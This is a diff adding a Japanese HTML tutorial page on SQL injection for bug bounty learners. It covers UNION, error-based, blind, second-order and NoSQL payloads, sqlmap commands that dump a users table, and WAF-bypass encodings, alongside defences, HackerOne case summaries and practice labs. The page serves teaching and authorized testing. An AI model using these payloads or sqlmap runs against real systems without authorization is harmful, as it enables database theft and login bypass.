@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 1: Core Vulnerabilities &gt; SQL Injection
+        </div>
+
+        <div class="page-header">
+            <h1>SQL Injection (SQLi)</h1>
+            <p class="subtitle">
+                アプリケーションのデータベースクエリにユーザー入力を注入し、
+                データ漏洩・改ざん・認証バイパス・RCE を実現する古典的だが依然として致命的な脆弱性。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-wsa">WSA Lab</span>
+                <span class="tag tag-handson">Hands-on</span>
+                <span class="tag tag-casestudy">Case Study</span>
+            </div>
+        </div>
+
+        <!-- 原理 -->
+        <div class="section">
+            <h2>原理と仕組み</h2>
+            <p>
+                SQL Injection は、アプリケーションがユーザー入力をSQL文に<strong>直接連結</strong>する際に発生する。
+                攻撃者はクエリの構文を壊し、任意のSQL文を実行させる。
+            </p>
+<pre><code>// 脆弱なコード (PHP)
+$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "' AND password = '" . $_GET['pass'] . "'";
+
+// 攻撃入力: user = admin'--
+// 結果のクエリ:
+SELECT * FROM users WHERE username = 'admin'--' AND password = ''
+// パスワードチェックがコメントアウトされ、admin でログイン成功</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">BB における SQLi の価値</div>
+                <p>
+                    SQLi は Critical〜High 評価が一般的。データベース全体の読み取り、管理者権限の奪取、
+                    場合によっては <code>xp_cmdshell</code> (MSSQL) や <code>LOAD_FILE</code> / <code>INTO OUTFILE</code> (MySQL) による RCE まで到達可能。
+                </p>
+            </div>
+        </div>
+
+        <!-- 種類 -->
+        <div class="section">
+            <h2>種類と分類</h2>
+
+            <h3>1. UNION-based SQLi</h3>
+            <p>
+                UNION SELECT を利用して追加のクエリ結果をレスポンスに含ませる。
+                レスポンスにデータが表示される場合に有効。
+            </p>
+<pre><code>// カラム数の特定
+' ORDER BY 1-- (成功)
+' ORDER BY 2-- (成功)
+' ORDER BY 3-- (エラー) → カラム数は 2
+
+// データ抽出
+' UNION SELECT username, password FROM users--
+' UNION SELECT NULL, table_name FROM information_schema.tables--</code></pre>
+
+            <h3>2. Error-based SQLi</h3>
+            <p>
+                データベースのエラーメッセージを利用してデータを抽出する。
+            </p>
+<pre><code>// MySQL
+' AND extractvalue(1, concat(0x7e, (SELECT version())))--
+// 出力: XPATH syntax error: '~8.0.32'
+
+// MSSQL
+' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--</code></pre>
+
+            <h3>3. Blind SQLi (Boolean-based)</h3>
+            <p>
+                レスポンスの差異（ページ内容やステータスコードの変化）からデータを1ビットずつ推測する。
+            </p>
+<pre><code>// True condition → 正常ページ表示
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
+
+// False condition → 異なるレスポンス
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--</code></pre>
+
+            <h3>4. Blind SQLi (Time-based)</h3>
+            <p>
+                レスポンス時間の遅延でデータを推測。レスポンスに一切差異がない場合に使用。
+            </p>
+<pre><code>// MySQL
+' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)--
+
+// PostgreSQL
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+// MSSQL
+'; IF (SELECT SUBSTRING(username,1,1) FROM users)='a' WAITFOR DELAY '0:0:5'--</code></pre>
+
+            <h3>5. Second-order SQLi</h3>
+            <p>
+                入力はまず安全に保存されるが、別の機能でそのデータがクエリに使われる際に
+                SQLi が発火する。テスト困難だが見逃されやすい。
+            </p>
+<pre><code>// 登録時: username = admin'-- (安全にDBに保存される)
+// パスワード変更時:
+UPDATE users SET password='newpass' WHERE username='admin'--'
+// admin のパスワードが変更される</code></pre>
+
+            <h3>6. NoSQL Injection</h3>
+            <p>
+                MongoDB, CouchDB 等の NoSQL データベースに対するインジェクション。
+                ORM (Mongoose, Sequelize) を使用していても安全とは限らない。
+            </p>
+<pre><code>// MongoDB operator injection
+POST /login
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+// 全ユーザーのうち最初のドキュメントでログイン
+
+// Mongoose での脆弱パターン
+User.find({username: req.body.username, password: req.body.password});
+// req.body.password = {"$ne": ""} → パスワードが空でないユーザーを全取得
+
+// $regex による情報抽出
+{"username": "admin", "password": {"$regex": "^a"}}</code></pre>
+        </div>
+
+        <!-- 検出方法 -->
+        <div class="section">
+            <h2>検出方法</h2>
+
+            <h3>手動テスト</h3>
+            <table>
+                <thead>
+                    <tr><th>テスト</th><th>入力</th><th>期待される反応</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>シングルクォート</td><td><code>'</code></td><td>SQL エラー or 挙動変化</td></tr>
+                    <tr><td>論理テスト</td><td><code>' OR 1=1--</code> / <code>' OR 1=2--</code></td><td>レスポンスの差異</td></tr>
+                    <tr><td>Time delay</td><td><code>' AND SLEEP(5)--</code></td><td>5秒の遅延</td></tr>
+                    <tr><td>UNION カラム数</td><td><code>' ORDER BY N--</code></td><td>N で エラー境界を特定</td></tr>
+                    <tr><td>算術</td><td><code>id=1-0</code> vs <code>id=1</code></td><td>同じ結果 = 数値注入可能</td></tr>
+                </tbody>
+            </table>
+
+            <h3>sqlmap の使い方</h3>
+<pre><code># 基本スキャン
+sqlmap -u "https://target.com/page?id=1" --batch
+
+# POST パラメータ
+sqlmap -u "https://target.com/login" --data="user=admin&pass=test" -p user
+
+# Cookie / Header ベース
+sqlmap -u "https://target.com/api" --cookie="session=abc" --headers="X-Token: xyz"
+
+# データベース列挙
+sqlmap -u "https://target.com/page?id=1" --dbs
+sqlmap -u "https://target.com/page?id=1" -D dbname --tables
+sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
+
+# テクニック指定 (T=Time, B=Boolean, U=Union, E=Error)
+sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=5
+
+# WAF バイパス
+sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between</code></pre>
+
+            <div class="callout warning">
+                <div class="callout-title">BB での sqlmap 使用注意</div>
+                <p>
+                    多くのプログラムで sqlmap の自動スキャンは <strong>禁止または推奨されない</strong>。
+                    手動で SQLi を確認してから、データ抽出の PoC として使用するのが安全。
+                    Rate limit 超過でBANされるリスクもある。
+                </p>
+            </div>
+        </div>
+
+        <!-- 防御と Bypass -->
+        <div class="section">
+            <h2>防御と Bypass</h2>
+
+            <h3>主な防御手法</h3>
+            <ul>
+                <li><strong>Parameterized Queries (Prepared Statements)</strong> - 最も効果的</li>
+                <li><strong>ORM の使用</strong> - ただし raw query や operator injection に注意</li>
+                <li><strong>入力バリデーション</strong> - ホワイトリスト方式</li>
+                <li><strong>WAF</strong> - バイパス可能だがレイヤード防御として有効</li>
+            </ul>
+
+            <h3>WAF Bypass テクニック</h3>
+<pre><code>// スペースの代替
+/**/  →  SELECT/**/username/**/FROM/**/users
+%09 (tab), %0a (newline), %0d (CR)
+
+// キーワードの難読化
+SeLeCt, SELE%43T, /*!50000SELECT*/
+
+// UNION フィルタ回避
+UNI%4FN, UN/**/ION, /*!UNION*/
+
+// 関数の代替
+SUBSTRING → MID, SUBSTR
+ASCII → ORD
+CONCAT → CONCAT_WS, GROUP_CONCAT
+
+// エンコーディング
+Hex: 0x61646d696e = 'admin'
+Double URL encode: %2527 → %27 → '</code></pre>
+        </div>
+
+        <!-- Real-World Reports -->
+        <div class="section">
+            <h2>Real-World Reports</h2>
+
+            <div class="card">
+                <div class="card-title">
+                    <a href="https://hackerone.com/reports/383127" target="_blank">#383127 - Valve: SQL Injection in report_xml.php through countryFilter[]</a>
+                </div>
+                <p><strong>Bounty: $25,000</strong> | Upvotes: 397</p>
+                <p>
+                    Valve の Steam パートナーシステムでの SQLi。在庫管理機能のパラメータに注入可能で、
+                    パートナーの機密データやゲームキーの情報にアクセス可能だった。
+                </p>
+                <ul>
+                    <li>Classic parameter injection in an authenticated endpoint</li>
+                    <li>高額報奨金の理由: パートナーの金銭的データへの直接アクセス</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <div class="card-title">
+                    <a href="https://hackerone.com/reports/868436" target="_blank">#868436 - Mail.ru (city-mobil.ru): Time-Based SQL Injection</a>
+                </div>
+                <p><strong>Bounty: $15,000</strong> | Upvotes: 631</p>
+                <p>
+                    Time-based Blind SQLi で、レスポンスに直接データが表示されないケース。
+                    SLEEP ベースの遅延で1文字ずつデータを抽出。根気のいる検出だが高評価。
+                </p>
+                <ul>
+                    <li>Blind SQLi でも Critical 評価を得られる好例</li>
+                    <li>重要: PoC でデータ抽出まで実演すると評価が上がる</li>
+                </ul>
+            </div>
+
+            <div class="callout success">
+                <div class="callout-title">報奨金分析</div>
+                <p>
+                    SQLi の報奨金は一般的に <strong>$5,000〜$25,000+</strong>。
+                    金額を左右する要素: (1) アクセス可能なデータの機密性、(2) RCE への escalation 可否、
+                    (3) 影響を受けるユーザー数、(4) 認証の有無（未認証 SQLi は最高評価）。
+                </p>
+            </div>
+        </div>
+
+        <!-- Practice -->
+        <div class="section">
+            <h2>Practice (WSA Labs)</h2>
+            <h3>PortSwigger Web Security Academy</h3>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank">Lab: SQL injection vulnerability in WHERE clause</a></li>
+                <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank">Lab: Determining the number of columns (UNION)</a></li>
+                <li><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses" target="_blank">Lab: Blind SQL injection with conditional responses</a></li>
+                <li><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval" target="_blank">Lab: Blind SQL injection with time delays</a></li>
+                <li><a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank">Lab: SQL injection attack, bypassing login</a></li>
+            </ul>
+
+            <h3>追加演習</h3>
+            <ul>
+                <li>SQLi-labs (GitHub) - 65+ のシナリオ別演習</li>
+                <li>DVWA - SQL Injection (Low/Medium/High)</li>
+                <li>HackTheBox - SQL injection challenges</li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>入力ポイントを広く探す</strong>: URL パラメータだけでなく、Cookie、HTTP ヘッダー、JSON body も対象</li>
+                    <li><strong>Blind SQLi を見逃さない</strong>: レスポンスに変化がなくても time-based で検出可能</li>
+                    <li><strong>NoSQL も忘れない</strong>: MongoDB の operator injection は現代の Web アプリで頻出</li>
+                    <li><strong>Second-order を意識する</strong>: 入力時ではなく、使用時に発火するパターン</li>
+                    <li><strong>PoC の質</strong>: alert(1) 相当ではなく、実データ抽出まで示す</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- References -->
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger - SQL Injection</a></li>
+                <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP - SQL Injection</a></li>
+                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank">PayloadsAllTheThings - SQL Injection</a></li>
+                <li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection" target="_blank">HackTricks - SQL Injection</a></li>
+            </ul>
+        </div>
+
+        <!-- Complete Button -->
+        <div style="text-align:center; margin:2rem 0;">
+            <button class="complete-btn" data-module-id="11-sqli" onclick="toggleComplete('11-sqli')">Mark Complete</button>
+        </div>
+
+        <!-- Page Nav -->
+        <div class="page-nav">
+            <a href="10-xss.html">&larr; Prev: XSS</a>
+            <a href="12-ssrf.html">Next: SSRF &rarr;</a>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
